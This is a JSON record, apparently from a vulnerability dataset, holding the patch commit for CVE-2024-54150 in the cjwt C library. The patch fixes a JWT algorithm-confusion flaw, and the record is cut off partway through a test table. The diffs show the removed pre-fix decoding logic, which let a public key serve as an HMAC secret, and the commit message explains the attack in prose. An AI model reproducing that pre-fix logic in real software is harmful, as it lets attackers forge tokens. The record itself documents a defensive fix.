{
    "CVE-2024-54150": {
        "published_date": "2024-12-19T18:22:33.901Z",
        "patch_commits": [
            {
                "url": "https://github.com/xmidt-org/cjwt/commit/096ab3e37f73c914b716e7259589179f363265fd",
                "content": "Merge commit from fork\n\n* chore:Fix a meson error.\n\n* Fix potential security issue due to unknown key types.\n\nHS256, HS384 & HS512 are symmetric key based algorithms that use an\narray of bytes as the key.  The array of bytes could be the public key\nof a RSxxx, ECxxx or PSxxx algorithm.  This means that unless the user\nof this library validated that the jwt algorithm matched the expected\nalgorithm type(s), the user could be using a compromised JWT and not\nrealize it.\n\nThis fix requires the caller to declare if they expect a symmetric\ncypher or not to prevent this attack and maintain the interface.  With\nthis change pub/private algorithms and symmetric algorithms are\nsegmented to protect the user from this kind of attack.\n\nFilename: README.md:\n```\n@@ -82,7 +82,11 @@\nint main( int argc, char *argv[] )\n \n     const char *hs_key = \"hs256-secret\";\n \n-    rv = cjwt_decode( hs_text, strlen(hs_text), 0, (uint8_t*) hs_key, strlen(hs_key), 0, 0, &jwt );\n+    rv = cjwt_decode( hs_text,\n+                      strlen(hs_text),\n+                      OPT_ALLOW_ONLY_HS_ALG,\n+                      (uint8_t*) hs_key,\n+                      strlen(hs_key), 0, 0, &jwt );\n     if( CJWTE_OK != rv ) {\n         printf( \"There was an error processing the text: %d\\n\", rv );\n         return -1;\n```\n\nFilename: include/cjwt/cjwt.h:\n```\n@@ -38,6 +38,15 @@\n*/\n #define OPT_ALLOW_ANY_TYP (1 << 2)\n \n+/* If you specify OPT_ALLOW_ONLY_HS_ALG as part of the options bitmask you\n+ * are allowing only the use of HMAC-SHA algorithms (HS256, HS384, HS512).\n+ * Otherwise only public key algorithms are allowed.\n+ *\n+ * Symmetric algorithms and the unknown key type passed in pose a security\n+ * risk since an attacker can treate the provided public key as the secret\n+ * key and sign their own JWTs with the public key as a symmetric key.\n+ */\n+#define OPT_ALLOW_ONLY_HS_ALG (1 << 3)\n \n /*----------------------------------------------------------------------------*/\n /*                               Data Structures                              */\n\n@@ -167,12 +176,22 @@\ntypedef struct {\n  *        are accepted unless OPT_ALLOW_ANY_TIME is specified as an option.\n  *\n  *  @note The key for HS signed JWTs is the plain text secret.\n+ * \n+ *  @note To accept HS signed JWTs, OPT_ALLOW_ONLY_HS_ALG must be specified as\n+ *        an option.  This option disables the use of public key algorithms.\n+ *        This is done to prevent an attacker from using a public key as a\n+ *        symmetric key and signing their own JWTs.\n  *\n  *  @note The key for PS, RS and EC signed JWTs expect the text from the PEM\n  *        file including the -----BEGIN PUBLIC KEY----- and\n  *        -----END PUBLIC KEY----- lines.\n  *\n  *  @note The 'time' parameter is seconds since Jan 1, 1970.\n+ * \n+ *  @note It is strongly encouraged to validate the 'alg' header to ensure\n+ *        that the JWT is signed with the expected algorithm.  This can be\n+ *        done by checking the 'alg' header against a known value in the cjwt_t\n+ *        object passed out via the jwt parameter.\n  *\n  *  @param text     [IN]  the original JWT text\n  *  @param text_len [IN]  length of the original text\n```\n\nFilename: src/cjwt.c:\n```\n@@ -2,6 +2,7 @@\n// SPDX-License-Identifier: Apache-2.0\n \n #include <cjson/cJSON.h>\n+#include <stdbool.h>\n #include <stdint.h>\n #include <stdio.h>\n #include <stdlib.h>\n\n@@ -22,26 +23,27 @@\n/*----------------------------------------------------------------------------*/\n struct alg_map {\n     cjwt_alg_t alg;\n+    bool symmetric;\n     const char *text;\n };\n \n /*----------------------------------------------------------------------------*/\n /*                            File Scoped Variables                           */\n /*----------------------------------------------------------------------------*/\n const struct alg_map the_alg_map[] = {\n-    { .alg = alg_none,  .text = \"none\"},\n-    {.alg = alg_es256, .text = \"ES256\"},\n-    {.alg = alg_es384, .text = \"ES384\"},\n-    {.alg = alg_es512, .text = \"ES512\"},\n-    {.alg = alg_hs256, .text = \"HS256\"},\n-    {.alg = alg_hs384, .text = \"HS384\"},\n-    {.alg = alg_hs512, .text = \"HS512\"},\n-    {.alg = alg_ps256, .text = \"PS256\"},\n-    {.alg = alg_ps384, .text = \"PS384\"},\n-    {.alg = alg_ps512, .text = \"PS512\"},\n-    {.alg = alg_rs256, .text = \"RS256\"},\n-    {.alg = alg_rs384, .text = \"RS384\"},\n-    {.alg = alg_rs512, .text = \"RS512\"}\n+    {.alg = alg_none,  .symmetric = false, .text = \"none\" },\n+    {.alg = alg_es256, .symmetric = false, .text = \"ES256\"},\n+    {.alg = alg_es384, .symmetric = false, .text = \"ES384\"},\n+    {.alg = alg_es512, .symmetric = false, .text = \"ES512\"},\n+    {.alg = alg_hs256, .symmetric = true,  .text = \"HS256\"},\n+    {.alg = alg_hs384, .symmetric = true,  .text = \"HS384\"},\n+    {.alg = alg_hs512, .symmetric = true,  .text = \"HS512\"},\n+    {.alg = alg_ps256, .symmetric = false, .text = \"PS256\"},\n+    {.alg = alg_ps384, .symmetric = false, .text = \"PS384\"},\n+    {.alg = alg_ps512, .symmetric = false, .text = \"PS512\"},\n+    {.alg = alg_rs256, .symmetric = false, .text = \"RS256\"},\n+    {.alg = alg_rs384, .symmetric = false, .text = \"RS384\"},\n+    {.alg = alg_rs512, .symmetric = false, .text = \"RS512\"}\n };\n \n /*----------------------------------------------------------------------------*/\n\n@@ -243,12 +245,21 @@\nstatic cjwt_code_t process_header_json(cjwt_t *cjwt, uint32_t options,\n         return CJWTE_HEADER_UNSUPPORTED_ALG;\n     }\n \n-    if ((alg_none == cjwt->header.alg)\n-        && (0 == (OPT_ALLOW_ALG_NONE & options)))\n-    {\n-        return CJWTE_HEADER_UNSUPPORTED_ALG;\n+    if (alg_none == cjwt->header.alg) {\n+        if (0 == (OPT_ALLOW_ALG_NONE & options)) {\n+            return CJWTE_HEADER_UNSUPPORTED_ALG;\n+        }\n     }\n \n+    if (true == the_alg_map[cjwt->header.alg].symmetric) {\n+        if (!(OPT_ALLOW_ONLY_HS_ALG & options)) {\n+            return CJWTE_HEADER_UNSUPPORTED_ALG;\n+        }\n+    } else {\n+        if (OPT_ALLOW_ONLY_HS_ALG & options) {\n+            return CJWTE_HEADER_UNSUPPORTED_ALG;\n+        }\n+    }\n \n     typ = cJSON_GetObjectItemCaseSensitive(json, \"typ\");\n     if (typ && (0 == (OPT_ALLOW_ANY_TYP & options))) {\n```\n\nFilename: subprojects/trower-base64.wrap:\n```\n@@ -8,5 +8,5 @@\nsource_filename = trower-base64-1.2.7.tar.gz\n source_url = https://github.com/xmidt-org/trower-base64/releases/download/v1.2.7/trower-base64-1.2.7.tar.gz\n source_hash = 9921ea1eca2328c6cadc058df805e6ac58cca06c0737ac21b987ba13b8697ad9\n \n-[provides]\n+[provide]\n libtrower_base64 = libtrower_base64_dep\n```\n\nFilename: tests/test_cjwt.c:\n```\n@@ -17,77 +17,78 @@\ntypedef struct {\n     int expected;\n     const char *jwt_file_name;\n     bool is_key_in_file;\n+    bool expect_symmetric;\n     const char *key;\n     const char *decode_test_name;\n } test_case_t;\n \n test_case_t test_list[] = {\n-    {      0,        \"jwtn.txt\", false,                 \"\",      \"No Alg claims on on\"},\n-    {      0,       \"jwtnx.txt\", false,                 \"\",     \"No Alg claims off on\"},\n-    {      0,       \"jwtny.txt\", false,                 \"\",    \"No Alg claims off off\"},\n-    { EINVAL,       \"jwtia.txt\", false,     \"test_passwd1\",        \"HS256 invalid jwt\"},\n-    { EINVAL,       \"jwtib.txt\", false,     \"test_passwd1\",        \"HS256 invalid jwt\"},\n- // {  EINVAL,      \"jwtic.txt\", false,     \"test_passwd1\",        \"HS256 invalid jwt\"}, /*TBD */ //FAILED test after modifying verify_signature logic\n-    { EINVAL,       \"jwtid.txt\", false,     \"test_passwd1\",        \"HS256 invalid jwt\"},\n-    { EINVAL,       \"jwtie.txt\", false,     \"test_passwd1\",        \"HS256 invalid jwt\"},\n-    { EINVAL,       \"jwtif.txt\", false,     \"test_passwd1\",        \"HS256 invalid jwt\"},\n-    {      0,        \"jwt1.txt\", false,     \"test_passwd1\",       \"HS256 claims on on\"},\n-    { EINVAL,        \"jwt1.txt\", false,     \"test_passbad\",       \"HS256 claims on on\"},\n-    {      0,        \"jwt2.txt\", false,     \"test_passwd2\",       \"HS384 claims on on\"},\n-    { EINVAL,        \"jwt2.txt\", false,     \"test_passbad\",       \"HS384 claims on on\"},\n-    {      0,        \"jwt3.txt\", false,     \"test_passwd3\",       \"HS512 claims on on\"},\n-    { EINVAL,        \"jwt3.txt\", false,     \"test_passbad\",       \"HS512 claims on on\"},\n-    {      0,        \"jwt5.txt\",  true,      \"pubkey5.pem\",       \"RS384 claims on on\"},\n-    { EINVAL,        \"jwt5.txt\",  true,      \"badkey4.pem\",       \"RS384 claims on on\"},\n-    {      0,        \"jwt4.txt\",  true,      \"pubkey4.pem\",       \"RS256 claims on on\"},\n-    { EINVAL,        \"jwt4.txt\",  true,      \"badkey4.pem\",       \"RS256 claims on on\"},\n-    {      0,        \"jwt6.txt\",  true,      \"pubkey6.pem\",       \"RS512 claims on on\"},\n-    { EINVAL,        \"jwt6.txt\",  true,      \"badkey6.pem\",       \"RS512 claims on on\"},\n-    {      0,       \"jwt1x.txt\", false,     \"test_passwd1\",      \"HS256 claims off on\"},\n-    { EINVAL,       \"jwt1x.txt\", false,    \"test_prasswd1\",      \"HS256 claims off on\"},\n-    {      0,       \"jwt2x.txt\", false,     \"test_passwd2\",      \"HS384 claims off on\"},\n-    { EINVAL,       \"jwt2x.txt\", false,    \"twest_passwd2\",      \"HS384 claims off on\"},\n-    {      0,       \"jwt3x.txt\", false,     \"test_passwd3\",      \"HS512 claims off on\"},\n-    { EINVAL,       \"jwt3x.txt\", false,  \"test_passwd3...\",      \"HS512 claims off on\"},\n-    {      0,       \"jwt4x.txt\",  true,      \"pubkey4.pem\",      \"RS256 claims off on\"},\n-    { EINVAL,       \"jwt4x.txt\",  true,      \"pubkey5.pem\",      \"RS256 claims off on\"},\n-    {      0,       \"jwt5x.txt\",  true,      \"pubkey5.pem\",      \"RS384 claims off on\"},\n-    { EINVAL,       \"jwt5x.txt\",  true,      \"badkey5.pem\",      \"RS384 claims off on\"},\n-    {      0,       \"jwt6x.txt\",  true,      \"pubkey6.pem\",      \"RS512 claims off on\"},\n-    { EINVAL,       \"jwt6x.txt\",  true,      \"badkey6.pem\",      \"RS512 claims off on\"},\n-    {      0,       \"jwt1y.txt\", false,     \"test_passwd1\",     \"HS256 claims off off\"},\n-    { EINVAL,       \"jwt1y.txt\", false,     \"tast_passwd1\",     \"HS256 claims off off\"},\n-    {      0,       \"jwt2y.txt\", false,     \"test_passwd2\",     \"HS384 claims off off\"},\n-    { EINVAL,       \"jwt2y.txt\", false,    \"test..passwd2\",     \"HS384 claims off off\"},\n-    {      0,       \"jwt3y.txt\", false,     \"test_passwd3\",     \"HS512 claims off off\"},\n-    { EINVAL,       \"jwt3y.txt\", false, \"tteesstt_passwd3\",     \"HS512 claims off off\"},\n-    {      0,       \"jwt4y.txt\",  true,      \"pubkey4.pem\",     \"RS256 claims off off\"},\n-    { EINVAL,       \"jwt4y.txt\",  true,      \"badkey4.pem\",     \"RS256 claims off off\"},\n-    {      0,       \"jwt5y.txt\",  true,      \"pubkey5.pem\",     \"RS384 claims off off\"},\n-    { EINVAL,       \"jwt5y.txt\",  true,      \"pubkey6.pem\",     \"RS384 claims off off\"},\n-    {      0,       \"jwt6y.txt\",  true,      \"pubkey6.pem\",     \"RS512 claims off off\"},\n-    { EINVAL,       \"jwt6y.txt\",  true,      \"pubkey5.pem\",     \"RS512 claims off off\"},\n-    {      0,       \"jwt1l.txt\", false,     \"test_passwd1\",        \"HS256 claims long\"},\n-    { EINVAL,       \"jwt1l.txt\", false,    \"test_keyword1\",        \"HS256 claims long\"},\n-    {      0,       \"jwt2l.txt\", false,     \"test_passwd2\",        \"HS384 claims long\"},\n-    { EINVAL,       \"jwt2l.txt\", false,     \"test_passwd1\",        \"HS384 claims long\"},\n-    {      0,       \"jwt3l.txt\", false,     \"test_passwd3\",        \"HS512 claims long\"},\n-    { EINVAL,       \"jwt3l.txt\", false,          \"passwd3\",        \"HS512 claims long\"},\n-    {      0,       \"jwt4l.txt\",  true,      \"pubkey4.pem\",        \"RS256 claims long\"},\n-    { EINVAL,       \"jwt4l.txt\",  true,      \"badkey4.pem\",        \"RS256 claims long\"},\n-    {      0,       \"jwt5l.txt\",  true,      \"pubkey5.pem\",        \"RS384 claims long\"},\n-    { EINVAL,       \"jwt5l.txt\",  true,      \"badkey5.pem\",        \"RS384 claims long\"},\n-    {      0,       \"jwt6l.txt\",  true,      \"pubkey6.pem\",        \"RS512 claims long\"},\n-    { EINVAL,       \"jwt6l.txt\",  true,      \"badkey6.pem\",        \"RS512 claims long\"},\n-    {      0,        \"jwt2.txt\", false,     \"test_passwd2\",       \"HS384 claims on on\"},\n-    {      0,        \"jwt3.txt\", false,     \"test_passwd3\",       \"HS512 claims on on\"},\n-    {      0,  \"jwt8_hs256.txt\",  true,   \"key8_hs256.pem\",       \"HS256 claims on on\"},\n-    {      0,  \"jwt9_hs384.txt\",  true,   \"key9_hs384.pem\",       \"HS384 claims on on\"},\n-    {      0, \"jwt10_hs512.txt\",  true,  \"key10_hs512.pem\",       \"HS512 claims on on\"},\n-    { EINVAL,       \"jwt11.txt\", false,    \"incorrect_key\",         \"RS256 claims all\"},\n-    { EINVAL,       \"jwt12.txt\", false,    \"incorrect_key\",         \"RS256 claims all\"},\n-    { EINVAL,       \"jwt13.txt\", false,    \"incorrect_key\",         \"RS256 claims all\"},\n-    {ENOTSUP,   \"jwtbadalg.txt\", false,    \"incorrect_key\", \"Invalid/unsupported alg.\"}\n+    {      0,        \"jwtn.txt\", false, false,                  \"\",      \"No Alg claims on on\"},\n+    {      0,       \"jwtnx.txt\", false, false,                  \"\",     \"No Alg claims off on\"},\n+    {      0,       \"jwtny.txt\", false, false,                  \"\",    \"No Alg claims off off\"},\n+    { EINVAL,       \"jwtia.txt\", false, true,       \"test_passwd1\",        \"HS256 invalid jwt\"},\n+    { EINVAL,       \"jwtib.txt\", false, true,       \"test_passwd1\",        \"HS256 invalid jwt\"},\n+ // {  EINVAL,      \"jwtic.txt\", false, true,       \"test_passwd1\",        \"HS256 invalid jwt\"}, /*TBD */ //FAILED test after modifying verify_signature logic\n+    { EINVAL,       \"jwtid.txt\", false, true,       \"test_passwd1\",        \"HS256 invalid jwt\"},\n+    { EINVAL,       \"jwtie.txt\", false, true,       \"test_passwd1\",        \"HS256 invalid jwt\"},\n+    { EINVAL,       \"jwtif.txt\", false, true,       \"test_passwd1\",        \"HS256 invalid jwt\"},\n+    {      0,        \"jwt1.txt\", false, true,       \"test_passwd1\",       \"HS256 claims on on\"},\n+    { EINVAL,        \"jwt1.txt\", false, true,       \"test_passbad\",       \"HS256 claims on on\"},\n+    {      0,        \"jwt2.txt\", false, true,       \"test_passwd2\",       \"HS384 claims on on\"},\n+    { EINVAL,        \"jwt2.txt\", false, true,       \"test_passbad\",       \"HS384 claims on on\"},\n+    {      0,        \"jwt3.txt\", false, true,       \"test_passwd3\",       \"HS512 claims on on\"},\n+    { EINVAL,        \"jwt3.txt\", false, true,       \"test_passbad\",       \"HS512 claims on on\"},\n+    {      0,        \"jwt5.txt\",  true, false,       \"pubkey5.pem\",       \"RS384 claims on on\"},\n+    { EINVAL,        \"jwt5.txt\",  true, false,       \"badkey4.pem\",       \"RS384 claims on on\"},\n+    {      0,        \"jwt4.txt\",  true, false,       \"pubkey4.pem\",       \"RS256 claims on on\"},\n+    { EINVAL,        \"jwt4.txt\",  true, false,       \"badkey4.pem\",       \"RS256 claims on on\"},\n+    {      0,        \"jwt6.txt\",  true, false,       \"pubkey6.pem\",       \"RS512 claims on on\"},\n+    { EINVAL,        \"jwt6.txt\",  true, false,       \"badkey6.pem\",       \"RS512 claims on on\"},\n+    {      0,       \"jwt1x.txt\", false, true,       \"test_passwd1\",      \"HS256 claims off on\"},\n+    { EINVAL,       \"jwt1x.txt\", false, true,      \"test_prasswd1\",      \"HS256 claims off on\"},\n+    {      0,       \"jwt2x.txt\", false, true,       \"test_passwd2\",      \"HS384 claims off on\"},\n+    { EINVAL,       \"jwt2x.txt\", false, true,      \"twest_passwd2\",      \"HS384 claims off on\"},\n+    {      0,       \"jwt3x.txt\", false, true,       \"test_passwd3\",      \"HS512 claims off on\"},\n+    { EINVAL,       \"jwt3x.txt\", false, true,    \"test_passwd3...\",      \"HS512 claims off on\"},\n+    {      0,       \"jwt4x.txt\",  true, false,       \"pubkey4.pem\",      \"RS256 claims off on\"},\n+    { EINVAL,       \"jwt4x.txt\",  true, false,       \"pubkey5.pem\",      \"RS256 claims off on\"},\n+    {      0,       \"jwt5x.txt\",  true, false,       \"pubkey5.pem\",      \"RS384 claims off on\"},\n+    { EINVAL,       \"jwt5x.txt\",  true, false,       \"badkey5.pem\",      \"RS384 claims off on\"},\n+    {      0,       \"jwt6x.txt\",  true, false,       \"pubkey6.pem\",      \"RS512 claims off on\"},\n+    { EINVAL,       \"jwt6x.txt\",  true, false,       \"badkey6.pem\",      \"RS512 claims off on\"},\n+    {      0,       \"jwt1y.txt\", false, true,       \"test_passwd1\",     \"HS256 claims off off\"},\n+    { EINVAL,       \"jwt1y.txt\", false, true,       \"tast_passwd1\",     \"HS256 claims off off\"},\n+    {      0,       \"jwt2y.txt\", false, true,       \"test_passwd2\",     \"HS384 claims off off\"},\n+    { EINVAL,       \"jwt2y.txt\", false, true,      \"test..passwd2\",     \"HS384 claims off off\"},\n+    {      0,       \"jwt3y.txt\", false, true,       \"test_passwd3\",     \"HS512 claims off off\"},\n+    { EINVAL,       \"jwt3y.txt\", false, true,   \"tteesstt_passwd3\",     \"HS512 claims off off\"},\n+    {      0,       \"jwt4y.txt\",  true, false,       \"pubkey4.pem\",     \"RS256 claims off off\"},\n+    { EINVAL,       \"jwt4y.txt\",  true, false,       \"badkey4.pem\",     \"RS256 claims off off\"},\n+    {      0,       \"jwt5y.txt\",  true, false,       \"pubkey5.pem\",     \"RS384 claims off off\"},\n+    { EINVAL,       \"jwt5y.txt\",  true, false,       \"pubkey6.pem\",     \"RS384 claims off off\"},\n+    {      0,       \"jwt6y.txt\",  true, false,       \"pubkey6.pem\",     \"RS512 claims off off\"},\n+    { EINVAL,       \"jwt6y.txt\",  true, false,       \"pubkey5.pem\",     \"RS512 claims off off\"},\n+    {      0,       \"jwt1l.txt\", false, true,       \"test_passwd1\",        \"HS256 claims long\"},\n+    { EINVAL,       \"jwt1l.txt\", false, true,      \"test_keyword1\",        \"HS256 claims long\"},\n+    {      0,       \"jwt2l.txt\", false, true,       \"test_passwd2\",        \"HS384 claims long\"},\n+    { EINVAL,       \"jwt2l.txt\", false, true,       \"test_passwd1\",        \"HS384 claims long\"},\n+    {      0,       \"jwt3l.txt\", false, true,       \"test_passwd3\",        \"HS512 claims long\"},\n+    { EINVAL,       \"jwt3l.txt\", false, true,            \"passwd3\",        \"HS512 claims long\"},\n+    {      0,       \"jwt4l.txt\",  true, false,       \"pubkey4.pem\",        \"RS256 claims long\"},\n+    { EINVAL,       \"jwt4l.txt\",  true, false,       \"badkey4.pem\",        \"RS256 claims long\"},\n+    {      0,       \"jwt5l.txt\",  true, false,       \"pubkey5.pem\",        \"RS384 claims long\"},\n+    { EINVAL,       \"jwt5l.txt\",  true, false,       \"badkey5.pem\",        \"RS384 claims long\"},\n+    {      0,       \"jwt6l.txt\",  true, false,       \"pubkey6.pem\",        \"RS512 claims long\"},\n+    { EINVAL,       \"jwt6l.txt\",  true, false,       \"badkey6.pem\",        \"RS512 claims long\"},\n+    {      0,        \"jwt2.txt\", false, true,       \"test_passwd2\",       \"HS384 claims on on\"},\n+    {      0,        \"jwt3.txt\", false, true,       \"test_passwd3\",       \"HS512 claims on on\"},\n+    {      0,  \"jwt8_hs256.txt\",  true, true,     \"key8_hs256.pem\",       \"HS256 claims on on\"},\n+    {      0,  \"jwt9_hs384.txt\",  true, true,     \"key9_hs384.pem\",       \"HS384 claims on on\"},\n+    {      0, \"jwt10_hs512.txt\",  true, true,    \"key10_hs512.pem\",       \"HS512 claims on on\"},\n+    { EINVAL,       \"jwt11.txt\", false, false,     \"incorrect_key\",         \"RS256 claims all\"},\n+    { EINVAL,       \"jwt12.txt\", false, false,     \"incorrect_key\",         \"RS256 claims all\"},\n+    { EINVAL,       \"jwt13.txt\", false, false,     \"incorrect_key\",         \"RS256 claims all\"},\n+    {ENOTSUP,   \"jwtbadalg.txt\", false, false,     \"incorrect_key\", \"Invalid/unsupported alg.\"}\n };\n \n #define _NUM_TEST_CASES (sizeof(test_list) / sizeof(test_case_t))\n\n@@ -154,11 +155,13 @@\nvoid test_case(unsigned _i)\n     cjwt_t *jwt        = NULL;\n     char jwt_buf[65535];\n     char pem_buf[8192];\n+    int options;\n     jwt_fname        = test_list[_i].jwt_file_name;\n     key_str          = test_list[_i].key;\n     key_len          = strlen(key_str);\n     expected         = test_list[_i].expected;\n     decode_test_name = test_list[_i].decode_test_name;\n+    options          = OPT_ALLOW_ALG_NONE | OPT_ALLOW_ANY_TIME;\n \n     if (key_len == 0) {\n         key_str = NULL;\n\n@@ -188,8 +191,11 @@\nvoid test_case(unsigned _i)\n     jwt_bytes = read_file(jwt_fname, jwt_buf, sizeof(jwt_buf));\n \n     if (jwt_bytes > 0) {\n+        if (test_list[_i].expect_symmetric) {\n+            options |= OPT_ALLOW_ONLY_HS_ALG;\n+        }\n         result = cjwt_decode(jwt_buf, strlen(jwt_buf),\n-                             OPT_ALLOW_ALG_NONE | OPT_ALLOW_ANY_TIME,\n+                             options,\n                              (const uint8_t *) key_str, key_len,\n                              0, 0, &jwt);\n     } else {\n```\n\nFilename: tests/test_cjwt_new.c:\n```\n@@ -20,6 +20,7 @@\ntypedef struct {\n     const char *filename;\n     const char *key_fn;\n     const char *key;\n+    uint32_t options;\n     cjwt_code_t expected;\n } test_case_t;\n\n@@ -37,75 +38,87 @@\ntypedef struct {\n test_case_t test_list[] = {\n     /* Valid, positive tests */\n     /*------------------------------------------------------------------------*/\n-    { \"HS256\", \"hs256.jwt\", NULL,            \"hs256-secret\", CJWTE_OK },\n-    { \"HS384\", \"hs384.jwt\", NULL,            \"hs384-secret\", CJWTE_OK },\n-    { \"HS512\", \"hs512.jwt\", NULL,            \"hs512-secret\", CJWTE_OK },\n-    { \"RS256\", \"rs256.jwt\", \"rs.pub\",        NULL,           CJWTE_OK },\n-    { \"RS384\", \"rs384.jwt\", \"rs.pub\",        NULL,           CJWTE_OK },\n-    { \"RS512\", \"rs512.jwt\", \"rs.pub\",        NULL,           CJWTE_OK },\n-    { \"ES256\", \"es256.jwt\", \"es256.jwt.pub\", NULL,           CJWTE_OK },\n-    { \"ES384\", \"es384.jwt\", \"es384.jwt.pub\", NULL,           CJWTE_OK },\n-    { \"ES512\", \"es512.jwt\", \"es512.jwt.pub\", NULL,           CJWTE_OK },\n-    { \"PS256\", \"ps256.jwt\", \"ps.pub\",        NULL,           CJWTE_OK },\n-    { \"PS384\", \"ps384.jwt\", \"ps.pub\",        NULL,           CJWTE_OK },\n-    { \"PS512\", \"ps512.jwt\", \"ps.pub\",        NULL,           CJWTE_OK },\n+    { \"HS256\", \"hs256.jwt\", NULL,            \"hs256-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_OK },\n+    { \"HS384\", \"hs384.jwt\", NULL,            \"hs384-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_OK },\n+    { \"HS512\", \"hs512.jwt\", NULL,            \"hs512-secret\", OPT_ALLOW_ONLY_HS_ALG, CJWTE_OK },\n+    { \"RS256\", \"rs256.jwt\", \"rs.pub\",        NULL,           0,                     CJWTE_OK },\n+    { \"RS384\", \"rs384.jwt\", \"rs.pub\",        NULL,           0,                     CJWTE_OK },\n+    { \"RS512\", \"rs512.jwt\", \"rs.pub\",        NULL,           0,                     CJWTE_OK },\n+    { \"ES256\", \"es256.jwt\", \"es256.jwt.pub\", NULL,           0,                     CJWTE_OK },\n+    { \"ES384\", \"es384.jwt\", \"es384.jwt.pub\", NULL,           0,                     CJWTE_OK },\n+    { \"ES512\", \"es512.jwt\", \"es512.jwt.pub\", NULL,           0,                     CJWTE_OK },\n+    { \"PS256\", \"ps256.jwt\", \"ps.pub\",        NULL,           0,                     CJWTE_OK },\n+    { \"PS384\", \"ps384.jwt\", \"ps.pub\",        NULL,           0,                     CJWTE_OK },\n+    { \"PS512\", \"ps512.jwt\", \"ps.pub\",        NULL,           0,                     CJWTE_OK },\n \n     /* Negative tests around signature validation */\n     /*------------------------------------------------------------------------*/\n-    { \"HS256 bad secret\",  \"hs256.jwt\",   NULL,            \"hs000-secret\", CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"HS384 bad secret\",  \"hs384.jwt\",   NULL,            \"hs000-secret\", CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"HS512 bad secret\",  \"hs512.jwt\",   NULL,            \"hs000-secret\", CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"HS256 NULL secret\", \"hs256.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"HS384 NULL secret\", \"hs384.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"HS512 NULL secret\", \"hs512.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-\n-    { \"RS256 bad secret\",  \"rs256.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"RS384 bad secret\",  \"rs384.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"RS512 bad secret\",  \"rs512.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"RS256 partial\",     \"rs256.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"RS384 partial\",     \"rs384.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"RS512 partial\",     \"rs512.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"RS256 invalid\",     \"rs256.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"RS384 invalid\",     \"rs384.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"RS512 invalid\",     \"rs512.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"RS256 NULL secret\", \"rs256.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-    { \"RS384 NULL secret\", \"rs384.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-    { \"RS512 NULL secret\", \"rs512.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-\n-    { \"PS256 bad secret\",  \"ps256.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"PS384 bad secret\",  \"ps384.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"PS512 bad secret\",  \"ps512.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"PS256 partial\",     \"ps256.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"PS384 partial\",     \"ps384.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"PS512 partial\",     \"ps512.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"PS256 invalid\",     \"ps256.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"PS384 invalid\",     \"ps384.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"PS512 invalid\",     \"ps512.jwt\",   \"es256.jwt.pub\", NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"PS256 NULL secret\", \"ps256.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-    { \"PS384 NULL secret\", \"ps384.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-    { \"PS512 NULL secret\", \"ps512.jwt\",   NULL,            NULL,           CJWTE_SIGNATURE_MISSING_KEY       },\n-\n-    { \"ES256 bad secret\",  \"es256.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"ES384 bad secret\",  \"es384.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"ES512 bad secret\",  \"es512.jwt\",   \"rs-alt.pub\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"ES256 partial\",     \"es256.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"ES384 partial\",     \"es384.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"ES512 partial\",     \"es512.jwt\",   \"rs.partial\",    NULL,           CJWTE_SIGNATURE_INVALID_KEY       },\n-    { \"ES256 invalid\",     \"es256.jwt\",   \"es512.jwt.pub\", NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { \"ES384 invalid\",     \"es384.jwt\",   \"es512.jwt.pub\", NULL,           CJWTE_SIGNATURE_VALIDATION_FAILED },\n-    { 